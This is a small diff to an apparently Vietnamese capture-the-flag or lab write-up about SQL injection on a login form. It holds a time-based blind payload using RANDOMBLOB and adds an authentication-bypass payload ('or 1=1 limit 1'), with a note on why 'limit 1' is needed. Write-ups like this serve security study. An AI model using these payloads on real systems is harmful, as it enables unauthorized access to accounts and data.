@@ -12,7 +12,11 @@ Payload: **user=admin' OR 9766=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))
 
 Cách 2: Không sử dụng sqlmap
 
-Payload: **' or 1=1 limit 1—**
+Thử payload **' or 1=1—** có xuất hiện thông báo cố gắng đăng nhập với nhiều hơn 1 người dùng, ta thêm limit vào truy vấn để lấy thêm 1 bản ghi là ok
+
+![image-20200608212038543](images/image-20200608212038543.png)
+
+Payload: **user' or 1=1 limit 1—&pass=**
 
 
 
